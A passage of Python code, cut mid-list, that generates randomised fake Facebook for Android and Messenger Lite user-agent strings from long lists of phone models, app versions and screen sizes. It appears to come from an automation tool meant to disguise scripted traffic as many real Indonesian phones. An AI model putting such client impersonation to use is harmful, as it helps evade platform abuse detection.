'Lenovo_A936', 'Lenovo H75676', 'Lenovo I5', 'Lenovo-I960', 'IdeaPadA10', 'IdeaPadA10', 'IdeaPadA10', 'IdeaPadA10', 'IdeaPadA10', 'Ideapad K1', 'Ideapad K1', 'IdeaTabA1000-F', 'IdeaTabA1000-G', 'IdeaTabA1000-T', 'IdeaTabA1000-F', 'IdeaTabA1000-T', 'IdeaTabA1000-T', 'IdeaTabA1000-F', 'IdeaTabA1000-F', 'IdeaTabA1000-G', 'IdeaTabA1000-F', 'IdeaTab A2107A-F', 'IdeaTab A2107A-F', 'IdeaTabA2109A', 'IdeaTabA2109A', 'A2109A', 'IdeaTabA2109A', 'IdeaTabA2207A-H', 'IdeaTab A3000-H', 'IdeaTab A3000-H', 'Lenovo A3000-H', 'Lenovo A3000-H', 'IdeaTabA5000-E', 'IdeaTab_A5000-E', 'Lenovo B8080-H', 'IdeaTabS2109A-F', 'IdeaTabS2109A-F', 'IdeaTabS2109A-F', 'IdeaTabS2110AH', 'Lenovo S5000-F', 'Lenovo S5000-H', 'Lenovo S5000-H/JDQ39', 'Lenovo S6000-H', 'IdeaTab S6000-H', 'IdeaTab S6000-F', 'ar_AE Lenovo K10', 'Lenovo K10 Note', 'Lenovo L39051', 'Lenovo K10e70', 'Lenovo K10e70', 'Lenovo L38083', 'Lenovo L38082', 'Lenovo K11', 'Lenovo K11 Power', 'Lenovo K12', 'Lenovo XT2081-4', 'Lenovo K12 Note', 'Lenovo K12 Pro', 'Lenovo K13', 'Lenovo K13 Note', 'Lenovo K13 Pro', 'Lenovo K14', 'Lenovo K14 Note', 'Lenovo K14 Plus', 'Lenovo K15 Plus', 'Lenovo K30-W', 'Lenovo K50a40', 'Lenovo K50-t5', 'Lenovo K50-T5', 'K31-t3', 'Lenovo K31-t3', 'Lenovo K320t', 'arm Lenovo K320t', 'Lenovo K32c30', 'Lenovo K32c36', 'Lenovo K32c36', 'Lenovo K33', 'Lenovo K33b37', 'MZ-Lenovo K3note', 'Lenovo K4', 'Lenovo A7010a48', 'K350t', 'Lenovo A7020a48', 'Lenovo A7020a40', 'Lenovo K52e78', 'Lenovo L38012', 'Lenovo L38011', 'en Lenovo L38011', 'Lenovo L38011', 'Lenovo L38041', 'Lenovo K5 Pro', 'Lenovo_K50_T5', 'Lenovo K52t38', 'Lenovo K52t58', 'Lenovo K53', 'Lenovo K53b36', 'Lenovo L38031', 'Lenovo K33b36', 'Lenovo K33a48', 'Lenovo K53a48', 'Lenovo K33a42', 'Lenovo_K33a42', 'lenovoK7', 'Lenovo K8', 'Lenovo K8 Note', 'Lenovo K8 Plus', 'Lenovo K8 Plus', 'Lenovo K80M', 'Lenovo K80M', 'Lenovo_K80M', 'Lenovo K860', 'Lenovo L38043', 'Lenovo L38043', 'Lenovo K900', 'Lenovo K900', 'Lenovo_K900_ROW', 'Lenovo K910', 'Lenovo K910', 'Lenovo K910e', 'Lenovo L79041', 'Lenovo L70081', 'Lenovo L79031', 'Lenovo L79031', 'Lenovo L71091', 'Lenovo L71091', 'Lenovo L71091', 'Lenovo TB-9707F', 'Lenovo L71061', 'VR-1541F', 'TB-X704A', 'Lenovo TB-X704A', 'Lenovo N300', 'Lenovo N300', 'Lenovo N308', 'Lenovo Note 5', 'lenovo P01k000', 'Lenovo_P1m', 'Lenovo P1m', 'Lenovo P2a42', 'Lenovo P2a42', 'Lenovo P2c72', 'Lenovo P2c72', 'Lenovo P70', 'Lenovo P70', 'Lenovo p70', 'Lenovo P700', 'Lenovo P700i', 'Lenovo P770', 'Lenovo P770', 'Lenovo P770', 'Lenovo P770', 'Lenovo P780', 'Lenovo P780', 'Lenovo P780', 'Lenovo P90', 'Lenovo P90', 'Lenovo-P960', 'Lenovo PB1-750M', 'Lenovo PB2-650M', 'Lenovo PB2-670M', 'Lenovo PB1-770M', 'Lenovo S1c58', 'Lenovo S1L a40', 'Lenovo K520', 'Lenovo K520', 'Lenovo L58041', 'Lenovo L58091', 'Lenovo S580', 'Lenovo S580', 'Lenovo S60-a', 'Lenovo S60-a', 'Lenovo S60A', 'Lenovo S650', 'Lenovo S650', 'Lenovo S650', 'Lenovo S658t', 'Lenovo S660', 'LenovoS668T', 'Lenovo S668T', 'Lenovo S668t', 'Lenovo S720', 'Lenovo S720', 'Lenovo S720', 'Lenovo S720', 'Lenovo S720i', 'Lenovo S720i', 'Lenovo S750', 'lenovo s750', 'Lenovo S750', 'Lenovo S810t', 'Lenovo S820', 'Lenovo S820', 'Lenovo S820', 'lenovo S820c', 'Lenovo S820e', 'Lenovo S850', 'Lenovo S850t', 'Lenovo S856', 'Lenovo S858t', 'Lenovo S860', 'Lenovo S860', 'Lenovo S860', 'Lenovo S860', 'Lenovo S860/JDQ39', 'LNV-Lenovo S870e', 'Lenovo S880', 'Lenovo S880', 'Lenovo S890', 'Lenovo S890', 'Lenovo S890', 'Lenovo S890', 'Lenovo-S890/S100', 'Lenovo S898t', 'Lenovo S898t /V1.5', 'Lenovo s898t', 'Lenovo S90A', 'LenovoS90C', 'Lenovo S920', 'Lenovo S920', 'Lenovo S920/V1.5', 'Lenovo S930', 'Lenovo S938t', 'Lenovo S939', 'Lenovo S939', 'Lenovo S960', 'Lenovo S960', 'Lenovo TB-8505FS', 'Lenovo TB-8505XS', 'Lenovo TAB 2 A10-70L', 'Lenovo TAB 2 A7-30HC', 'Lenovo TAB 2 A7-30DC', 'Lenovo TAB 2 A7-30GC', 'Lenovo TB-8504F', 'Lenovo TB-8704F', 'A101LV', 'Lenovo TB-7504X', 'Lenovo TB-7504X', 'Lenovo TB-7304X', 'Lenovo TB-7304I', 'Lenovo TB-7304F', 'Lenovo TB-7104F', 'Lenovo TB-7104I', 'Lenovo TB-8304F1', 'Lenovo TB-8304F1', 'Lenovo TB-X6C6F', 'Lenovo TB-X6C6X', 'Lenovo TB-J606N', 'Lenovo TB-J607Z', 'Lenovo TB-X505F', 'Lenovo TB-X505X', 'Lenovo TB-X505L', 'Lenovo TB-X605F', 'TB328FU', 'TB328XU', 'Lenovo TB-X605L', 'Lenovo TB-X605M', 'Lenovo TB-X606XA', 'Lenovo TB-X606F', 'Lenovo TB-X605LC', 'Lenovo TB-X605FC', 'Lenovo TB-X306FA', 'Lenovo TB-X306X', 'Lenovo TB125FU', 'Lenovo TB128XU', 'TB128FU', 'Lenovo TB-7305X', 'Lenovo TB-7305X', 'Lenovo TB-7305F', 'Lenovo TB-7305I', 'Lenovo TB-7306F', 'Lenovo TB-7306X', 'Lenovo TB-8506F', 'Lenovo TB-8506FS', 'Lenovo TB-8506X', 'Lenovo TB-8705F', 'Lenovo TB-X705L', 'Lenovo TB-X705F', 'Lenovo TB-J606F', 'Lenovo TB-J606L', 'TB350FU', 'Lenovo TB-J616F', 'Lenovo TB-J616X', 'Lenovo TB-J706F', 'Lenovo TB-J706L', 'TB132FU', 'Lenovo TB-Q706F', 'Lenovo TB-Q706Z', 'Lenovo TB-J607F', 'Lenovo PB-6505M', 'Lenovo PB-6505Y', 'Lenovo TB3-X70F', 'Lenovo TB3-X70L', 'Lenovo TB3-730X', 'Lenovo TB3-710I', 'Lenovo TB3-710F', 'Lenovo TB-7703X', '601LV', 'Lenovo TB3-850M', 'Lenovo TB3-850F', '602LV', 'Lenovo TB-8703X', 'Lenovo TB-8703F', 'Lenovo TB-X304L', 'Lenovo TB-X304F', 'Lenovo TB-X704L', 'Lenovo TB-X704F', '701LV', 'Lenovo TB-8504X', 'Lenovo TB-8704X', 'Lenovo TB-8X04F', 'Lenovo TB350XU', 'Lenovo ThinkPad 13', 'ThinkPadTablet', 'ThinkPad Tablet', 'ThinkPad Tablet', 'ThinkPad Tablet', 'ThinkPad Tablet', 'Lenovo A1000m', 'Lenovo vibe a plus', 'Lenovo A2016a40', 'Lenovo A2016a40', 'Lenovo A2020a40', 'VIBE C', 'Lenovo A6020a41', 'Lenovo A6020l36', 'Lenovo A6020a40', 'Lenovo A6020l37', 'Lenovo A6020a46', 'Vibe K5 Plus', 'Lenovo P1a42', 'Lenovo P1c58', 'Lenovo P1a41', 'Vibe P1 Turbo', 'Lenovo P1ma40', 'Lenovo S1c50', 'Lenovo S1a40', 'Lenovo S1La40', 'VIBE_S2i', 'VIBE S3i', 'VIBE S5i', 'VIBE S6i', 'VIBE S6i Plus', 'VIBE S7i', 'Lenovo Z90a40', 'Lenovo Z90-7', 'VIBE V7', 'Lenovo X2-AP', 'Lenovo X2-TO', 'Lenovo X2-TO', 'Lenovo X3c70', 'Lenovo X3c50', 'Lenovo X3a40', 'Lenovo K51c78', 'Lenovo K51c78', 'Lenovo X3 Lite', 'Lenovo K910L', 'Lenovo K910L', 'Lenovo Vibe Z2', 'Lenovo K920', 'Lenovo X2-EU', 'Lenovo X2-EU', 'lenovo x606fa', 'TB138FC', 'Lenovo YT3-X90X', 'Lenovo YT3-X90L', 'Lenovo YT3-X90F', 'Lenovo YB-Q501F', 'Lenovo YB1-X90F', 'Lenovo YB1-X90L', 'Lenovo YT-K606F', 'Lenovo YT-X705L', 'Lenovo YT-X705X', 'Lenovo YT-X705F', 'Lenovo YT-J706F', 'Lenovo YT-J706X', 'Lenovo YT3-X50F', 'Lenovo YT3-X50L', 'Lenovo YT3-X50M', 'Lenovo YT3-850M', 'Lenovo YT3-850M', 'Lenovo YT3-850F', 'Lenovo YT3-850L', 'Lenovo YT-X703F', 'Lenovo YT-X703L', 'Lenovo B8000-H', 'Lenovo B8000-F', 'Yoga Tablet 2', 'Lenovo B6000-F/JDQ39', 'Lenovo B6000-HV', 'Lenovo Z2', 'Lenovo Z2', 'Z2 Plus', 'Lenovo Z2w', 'Lenovo L78011', 'Lenovo L78031', 'Lenovo Z5 Pro', 'Lenovo L78032', 'Lenovo L78071', 'Lenovo L78071', 'Lenovo Z5s', 'Lenovo L78121', 'Lenovo L78121', 'Lenovo L78121', 'Lenovo Z6 Lite', 'Lenovo L78051', 'Lenovo L38111', 'ZUK Z2151', 'ZUK Z2151', 'ZUK Z1', 'ZUK Z2132', 'ZUK Z2132', 'ZUK Z2131', 'ZUK Z2121'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/Lenovo;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            elif "Oneplus" in str(self.device):
                self.android_model = random.choice(['NE2213', 'NE2217', 'NE2215', 'NE2210', 'NE2210', 'CPH2423', 'CPH2411', 'CPH2417', 'CPH2413', 'CPH2415', 'CPH2449', 'CPH2487', 'ONE A2003', 'ONE A2003', 'ONE A2001', 'ONE A2005', 'ONEPLUS A3003', 'ONEPLUS A3000', 'ONEPLUS A3010', 'ONEPLUS A5000', 'ONEPLUS A5000', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A6003', 'ONEPLUS A6000', 'ONEPLUS A6010', 'ONEPLUS A6013', 'ONEPLUS A6010', 'GM1900', 'GM1901', 'GM1903', 'GM1917', 'GM1913', 'GM1911', 'GM1910', 'GM1915', 'GM1910', 'HD1901', 'HD1903', 'HD1900 Flow', 'HD1905', 'HD1900', 'HD1907', 'HD1911', 'HD1913', 'HD1910', 'GM1925', 'HD1925', 'GM1920', 'IN2013', 'IN2015', 'IN2010', 'IN2010', 'IN2017', 'IN2019', 'IN2023', 'IN2025', 'IN2020', 'OnePlus8Pro', 'KB2005', 'KB2001', 'KB2007', 'KB2003', 'KB2000', 'OnePlus 8T 5G', 'LE2115', 'LE2113', 'LE2111', 'LE2110', 'LE2120', 'LE2125', 'LE2123', 'LE2121', 'LE2127', 'OnePlus9Pro', 'LE2101', 'LE2100', 'MT2111', 'MT2110', 'ONEPLUS A19677', 'ONEPLUS A2345', 'Oneplus A31', 'Oneplus A3331', 'ONEPLUS A35904', 'ONEPLUS A37000', 'ONEPLUS A3EVB', 'ONEPLUS A62322', 'ONEPLUS A64794', 'ONEPLUS A65369', 'ONEPLUS A68333', 'ONEPLUS A70458', 'ONEPLUS A70791', 'ONEPLUS A78637', 'ONEPLUS A80828', 'ONEPLUS A83306', 'ONEPLUS A87046', 'ONEPLUS A90641', 'Oneplus A99831', 'PGKM10', 'PGKM10', 'PHK110', 'PHK110', 'PGP110', 'PGP110', 'PGZ110', 'ONEPLUS KB2023', 'OnePlus Nord', 'Oneplus Nord 2', 'DN2103', 'DN2101', 'CPH2399', 'CPH2401', 'AC2001', 'AC2003', 'IV2201', 'CPH2409', 'CPH2381', 'CPH2465', 'EB2103', 'EB2101', 'EB2101', 'BE2025', 'BE2026', 'BE2029', 'Nord N10 5G', 'BE2028', 'BE2013', 'BE2011', 'BE2012', 'CPH2459', 'GN2200', 'CPH2469', 'DE2118', 'DE2117', 'A0001', 'ONE E1001', 'ONE E1003', 'ONE E1001', 'ONE E1005'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/Oneplus;FBBD/Oneplus;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            elif "Advan" in str(self.device):
                self.android_model = random.choice(['5041', '5041', '5058', '5059', '5059', '5061', '5062', '5062', 'E1C_3G', 'E1C_3G', 'E1C Pro', '6004', '6002', '6002', '6201', 'i7U', 'i7U', 'i4U', 'i4U', 'i55D', 'i55D', 'i55K', 'i55K', 'i5C', 'i5C', 'i5C', 'I5E', 'i5E', 'i5E', 'i5K', 'i5K', 'i7A', 'I7D', 'I7D', 'ADVAN M4', '5202', '5505', '5505', 'ADVAN S40', 'ADVAN S40', 'S45E', 'S4Z', 'S4Z', 'S4Z', 'S4Z', 'i5G', 'S50H', 'S5E_NXT', 'S5E_NXT', 'S5E_NXT', 'S7D', 'S7D', 'ADVAN 1011', 'ADVAN T5C'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/ADVAN;FBBD/ADVAN;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            elif "Poco" in str(self.device):
                self.android_model = random.choice(['M2006C3MI', '211033MI', '22031116AI', '220333QPG', '220333QPG', 'POCO C40', 'POCO C40', 'POCO F2 Pro', 'POCO F2 Pro', 'M2012K11AG', 'M2104K10I', '22021211RG', '22021211RI', 'POCO F4', 'POCO F4', 'POCO F4', '21121210G', 'POCO F4 GT', 'POCO F4 GT', '23049PCD8G', '23013PC75G', 'M2004J19PI', 'POCO M2 Pro', 'POCO M2 Pro', 'M2010J19CI', 'M2010J19CG', 'POCO M3', 'POCO M3 Pro', 'POCO M3 Pro', 'M2103K19PG', 'POCO M3 Pro 5G', '22041219PG', '22041219PI', 'POCO M4 5G', '2201117PG', '21091116AG', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', '22071219CG', 'POCO M5', 'POCO M5', '22071219CI', '2207117BPG', 'POCO M5s', 'POCO X2', 'M2007J20CI', 'M2007J20CI', '21061110AG', 'M2007J20CG', 'M2102J20SG', 'M2102J20SI', '22041216G', 'POCO X4 GT', '22041216G', 'POCO X4 GT', 'POCO X4 GT', 'POCO X4 GT', '2201116PG', 'POCO X4 Pro 5G', '2201116PG', '2201116PI', '22111317PG', 'POCO X5 5G', 'POCO X5 5G', '22101320G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', '22101320G'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/POCO;FBBD/POCO;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            elif "Evercoss" in str(self.device):
                self.android_model = random.choice(['M50 STAR', 'A75 MAX', 'AT8B', 'A75 MAX', 'S55A', 'R70A'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/Evercoss;FBBD/Evercoss;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            else:
                self.android_model = random.choice(['Nokia 1', 'Nokia 1 Plus', 'Nokia 1011', 'Nokia 105', 'Nokia 2.1', 'Nokia 2 V', 'Nokia 2 V Tella', 'TA-1032', 'TA-1020', 'TA-1032', 'Nokia 3 V', 'Nokia_3310_4G', 'Nokia 3310', 'NOKIA 3310', 'Nokia 4', 'TA-1053', 'TA-1024', 'TA-1021', 'TA-1021', 'TA-1033', 'TA-1000', 'Nokia 1.3', 'TA-1041', 'Nokia 7', 'TA-1041', 'TA-1041', 'Nokia 7 plus', 'Nokia 7 plus', 'TA-1004', 'TA-1012', 'TA-1012', 'TA-1052', 'Nokia 8 Sirocco', 'Nokia 8910i', 'Nokia 8 V 5G UW', 'Nokia 9', 'Nokia C01 Plus', 'Nokia C01 Plus', 'Nokia C02', 'Nokia C1', 'es Nokia C1 Plus', 'Nokia C1', 'Nokia C1 Plus', 'Nokia C1 2nd Edition', 'Nokia C1', 'Nokia C1', 'Nokia C10', 'N152DL', 'Nokia C100', 'Nokia C12', 'Nokia C12 Pro', 'Nokia C2', 'Nokia C2', 'Nokia C2', 'Nokia C2 2nd Edition', 'Nokia C2 Tennen', 'Nokia C20', 'Nokia C20 Plus', 'Nokia C200', 'N151DL', 'Nokia C21', 'Nokia C21 Plus', 'Nokia C22', 'Nokia C3', 'Nokia C30', 'Nokia C31', 'Nokia C32', 'Nokia C5 Endi', 'Nokia G10', 'N150DL', 'Nokia G100', 'Nokia G11', 'Nokia G11 Plus', 'Nokia G20', 'Nokia G20', 'Nokia G21', 'Nokia G22', 'N1374DL', 'Nokia G400 5G', 'Nokia G50', 'Nokia G60 5G', 'Lumia 430', 'Nokia N900', 'Nokia Streaming Box 8000', 'Nokia T10', 'Nokia T20', 'Nokia T21', 'Nokia_X', 'Nokia_X', 'Nokia_X', 'Nokia X10', 'Nokia X100', 'Nokia_X2', 'NokiaX2DS', 'NokiaX2DS', 'NokiaX2DS', 'NokiaX2DS', 'Nokia X20', 'Nokia X30 5G', 'Nokia X5', 'Nokia X5', 'Nokia X6', 'Nokia X6', 'Nokia X7', 'Nokia X7', 'Nokia X71', 'Nokia_XL', 'Nokia_XL', 'Nokia_XL', 'Nokia XR20', 'Nokia XR21'])
                self.useragent = (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/Nokia;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')
            return (self.useragent)
        except (Exception) as e:
            self.android_version = random.choice(['9', '10', '11', '12', '13'])
            self.android_build = random.choice([
                f'RP1A.{random.randint(000000, 999999)}.0{random.randrange(11, 16)}',
                f'SP1A.{random.randint(000000, 999999)}.0{random.randrange(11, 16)}',
            ])
            self.android_model = random.choice(['RMX3661', 'RMX3687', 'RMX3686', 'RMX3241', 'RMX3388', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3612', 'RMX2202', 'RMX2121', 'RMX2176', 'RMX2052', 'RMX2075', 'RMX2076', 'RMX2144', 'RMX2111', 'RMX2200', 'RMX3092', 'RMX3093', 'RMX3042', 'RMX3041', 'RMX3125', 'RMX3122', 'RMX3121', 'RMX2205', 'RMX3161', 'RMX2205', 'RMX3396', 'RMX3572', 'RMX3242'])
            return (f'[FBAN/FB4A;FBAV/{self.app_version};FBBV/{random.randint(000000000, 999999999)};FBDM/' + '{' + str(self.density) + '}' + f';FBLC/id_ID;FBRV/0;FBCR/INDOSAT;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/{self.android_model};{self.android_version};FBCA/{self.arm64_v7a};]')

    def Messenger_Lite_Useragent(self):
        try:
            self.device = str(random.choice(Useragent['Device'].split(','))).capitalize()
            self.app_version = random.choice(['334.0.0.10.101', '337.0.0.5.102', '337.0.0.3.102', '336.0.0.7.99', '335.0.0.13.96', '335.0.0.10.96', '335.0.0.4.96', '334.0.0.6.101', '334.0.0.3.101', '333.0.0.6.108', '332.0.0.20.108', '332.0.0.15.108', '330.0.0.3.108', '329.0.0.8.106', '328.0.0.3.102', '327.1.0.12.106', '324.1.0.8.106', '325.0.0.1.108', '324.0.0.3.106', '323.0.0.8.106', '323.0.0.4.106', '322.0.0.4.110', '321.0.0.6.113', '320.0.0.4.108', '319.0.0.3.107', '318.0.0.7.105', '317.0.0.1.104', '316.0.0.3.113', '315.0.0.14.109', '315.0.0.5.109', '314.0.0.14.108', '314.0.0.13.108', '314.0.0.3.108', '313.0.0.1.110', '312.0.0.1.103', '311.0.0.9.114', '311.0.0.1.114', '310.0.0.3.108', '309.0.0.17.114', '309.0.0.13.114', '308.0.0.8.108', '308.0.0.7.108', '307.0.0.3.109', '306.0.0.11.107', '306.0.0.4.107', '305.0.0.7.106', '305.0.0.3.106', '304.0.0.6.106', '304.0.0.5.106', '303.0.0.11.106', '303.0.0.9.106', '303.0.0.4.106', '302.0.0.10.113', '302.0.0.4.113', '301.0.0.9.113', '299.0.0.4.111', '298.0.0.14.115', '298.0.0.13.115', '298.0.0.7.115', '298.0.0.6.115', '297.0.0.3.113', '296.0.0.10.111', '296.0.0.7.111', '295.0.0.4.119', '294.0.0.7.118', '293.0.0.8.114', '293.0.0.5.114', '292.0.0.4.109', '292.0.0.3.109', '291.0.0.11.110', '291.0.0.9.110', '291.0.0.7.110', '291.0.0.3.110', '290.0.0.16.120', '290.0.0.13.120', '290.0.0.6.120', '288.0.0.5.115', '288.0.0.3.115', '287.0.0.3.117', '286.0.0.3.105', '285.0.0.12.118', '285.0.0.11.118', '285.0.0.3.118', '284.0.0.6.118', '284.0.0.4.118', '284.0.0.3.118', '283.0.0.3.117', '282.0.0.1.117', '281.0.0.3.111', '280.0.0.8.119', '280.0.0.6.119', '280.0.0.3.119', '279.0.0.3.118', '278.0.0.4.120', '278.0.0.3.120', '277.0.0.10.119', '277.0.0.8.119', '277.0.0.4.119', '276.1.0.18.116', '276.0.0.16.116', '276.0.0.3.116', '275.0.0.9.116', '275.0.0.8.116', '275.0.0.5.116', '275.0.0.4.116', '274.0.0.3.117', '273.0.0.16.48', '273.0.0.15.48', '273.0.0.14.48', '273.0.0.13.48', '273.0.0.4.48', '273.0.0.3.48', '272.0.0.5.129', '271.0.0.3.119', '271.0.0.1.119', '270.0.0.3.118', '268.0.0.3.116', '267.0.0.11.118', '267.0.0.4.118', '266.0.0.12.118', '266.0.0.4.118', '265.0.0.15.119', '265.0.0.6.119', '264.0.0.5.111', '264.0.0.4.111', '263.0.0.11.117', '262.0.0.20.119', '262.0.0.18.119', '262.0.0.3.119', '261.0.0.8.119', '261.0.0.4.119', '260.0.0.8.119', '260.0.0.3.119', '259.0.0.8.120', '259.0.0.3.120', '258.0.0.7.119', '258.0.0.4.119', '257.0.0.13.171', '257.0.0.8.171', '257.0.0.7.171', '257.0.0.3.171', '256.0.0.16.119', '256.0.0.10.119', '255.0.0.5.119', '254.0.0.12.121', '254.0.0.11.121', '254.0.0.10.121', '254.0.0.6.121', '253.0.0.2.101', '142.0.0.2.117', '142.0.0.1.117', '141.0.0.2.117', '141.0.0.1.117', '140.0.0.5.118', '140.0.0.1.118', '139.0.0.3.118', '139.0.0.2.118', '139.0.0.1.118', '138.0.0.3.117', '138.0.0.2.117', '138.0.0.1.117', '137.0.0.4.115', '137.0.0.1.115', '136.0.0.1.111', '135.0.0.1.118', '133.0.0.1.116', '132.0.0.1.117', '131.0.0.2.117', '131.0.0.1.117', '130.0.0.1.121', '129.0.0.2.116', '129.0.0.1.116', '128.0.0.6.110', '128.0.0.5.110', '127.0.0.2.117', '127.0.0.1.117', '126.0.0.1.117', '125.0.0.1.117', '124.0.0.3.118', '124.0.0.1.118', '123.0.0.1.118', '122.0.0.1.116', '121.0.0.1.121', '120.0.0.1.118', '119.0.0.5.119', '119.0.0.2.119', '119.0.0.1.119', '118.0.0.3.126', '118.0.0.1.126', '117.0.0.2.115', '117.0.0.1.115', '116.0.0.2.121', '116.0.0.1.121', '115.0.0.2.114', '115.0.0.1.114', '114.0.0.4.114', '114.0.0.3.114', '114.0.0.2.114', '114.0.0.1.114', '113.0.0.3.118', '113.0.0.2.118', '113.0.0.1.118', '112.0.0.2.118', '112.0.0.1.118', '111.0.0.1.117', '110.0.0.2.119', '110.0.0.1.119', '109.0.0.2.120', '108.0.0.2.118', '109.0.0.1.120', '108.0.0.1.118', '107.0.0.1.117', '106.0.0.1.120', '105.0.0.4.120', '105.0.0.3.120', '104.2.0.4.118', '105.0.0.2.120', '104.1.0.4.118', '105.0.0.1.120', '104.0.0.4.118', '104.0.0.1.118', '103.0.0.1.109', '102.0.0.2.119', '102.0.0.1.119', '101.0.0.3.104', '101.0.0.1.104', '100.0.0.2.117', '100.0.0.1.117', '99.0.0.1.110', '98.0.0.2.119', '98.0.0.1.119', '97.0.0.2.120', '97.0.0.1.120', '96.0.0.3.119', '96.0.0.2.119', '96.0.0.1.119', '95.0.0.4.119', '95.0.0.3.119', '95.0.0.1.119', '94.0.0.4.120', '94.0.0.2.120', '94.0.0.1.120', '93.0.0.3.121', '93.0.0.1.121', '92.0.0.3.117', '92.0.0.2.117', '92.0.0.1.117', '91.0.0.5.118', '91.0.0.4.118', '91.0.0.2.118', '90.0.1.7.119', '90.0.0.7.119', '90.0.0.6.119', '90.0.0.2.119', '89.0.1.6.117', '89.0.0.5.117', '89.0.0.1.117', '88.0.1.4.106', '88.0.0.4.106', '88.0.0.2.106', '87.0.1.4.120', '87.0.0.4.120', '87.0.0.3.120', '86.0.1.3.126', '86.0.0.2.126', '86.0.0.1.126', '85.0.1.4.120', '85.0.0.4.120', '85.0.0.2.120'])
            self.android_build = random.choice([
                f'RP1A.{random.randint(000000, 999999)}.0{random.randrange(11, 16)}',
                f'SP1A.{random.randint(000000, 999999)}.0{random.randrange(11, 16)}',
            ])
            self.density = random.choice(['density=2.0,width=720,height=1384', 'density=2.0,width=720,height=1412', 'density=4.0,width=1440,height=2560', 'density=3.0,width=1080,height=1920', 'density=2.0,width=720,height=1456', 'density=3.0,width=1080,height=1920', 'density=1.5,width=540,height=960', 'density=1.5,width=540,height=888', 'density=3.0,width=1080,height=1776', 'density=1.5,width=480,height=800', 'density=1.3312501,width=1280,height=800', 'density=2.0,width=720,height=1184'])
            self.android_version = random.choice(['9', '10', '11', '12', '13'])
            self.arm64 = random.choice(['arm64-v8a:', 'armeabi-v7a:armeabi'])
            if "Xiaomi" in str(self.device):
                self.android_model = random.choice(['Xiaomi 10 Pro', '2107119DC', '2107119DC', '21091116UI', '21091116UI', '2201123G', '2201123C', 'Xiaomi 12', '2203129G', 'Xiaomi 12 Lite', '2201122G', 'Xiaomi 12 Pro', '2207122MC', '2207122MC', '2206123SC', '2206122SC', 'Xiaomi 12S Pro', '2206122SC', '2203121C', '2203121C', '2203121C', '22071212AG', 'Xiaomi 12T', 'Xiaomi 12T Pro', '22081212UG', 'Xiaomi 12T Pro', '2112123AG', '2211133G', '2211133C', 'Xiaomi 13', 'Xiaomi 13', 'Xiaomi 13', '2210129SG', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', '2210132C', 'Xiaomi 13 Pro', '2210132G', 'Xiaomi 13 Pro', '2210132C', 'xiaomi 6', 'xiaomi 6', 'xiaomi 8', 'SKR-H0', 'SKR-A0', 'SKW-H0', 'SKW-A0', 'DLT-H0', 'DLT-A0', 'SHARK KLE-A0', 'SHARK KLE-A0', 'Black Shark 3', 'SHARK KLE-A0', 'KLE-AO', 'SHARK KLE-H0', 'SHARK KLE-H0', 'SHARK MBU-A0', 'SHARK MBU-H0', 'SHARK MBU-H0', 'Black Shark 3S', 'SHARK PRS-H0', 'SHARK PRS-H0', 'SHARK PRS-A0', 'SHARK KSR-H0', 'SHARK KSR-A0', 'SHARK PAR-A0', 'SHARK PAR-H0', 'SHARK PAR-H0', 'SHARK KTUS-H0', 'SHARK KTUS-A0', 'SHARK KTUS-H0', 'AWM-A0', 'AWM-A0', 'AWM-A0', '2109119BC', '2109119BC', '2013023', '2013023', '2013023', '2013022', '2013022', '2013023', '2013023', '2014011', '2014011', 'id 2014011', '2014817', '2014817', '2014817', '2014817', '2014817', '2014817', '2014817', '2014818', '2014818', '2014818', '2014818', '2014818', '2014813', '2014811', '2014813', '2014811', '2014812', '2014813', '2014811', '2014813', '2014813', '2014811', '2014811', '2014501', '2014501', '2014501', 'HM NOTE 1TD', 'HM NOTE 1TD', 'Mi 10', 'Mi 10', 'Mi 10', 'M2002J9G', 'M2002J9E', 'M2002J9E', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Ultra', 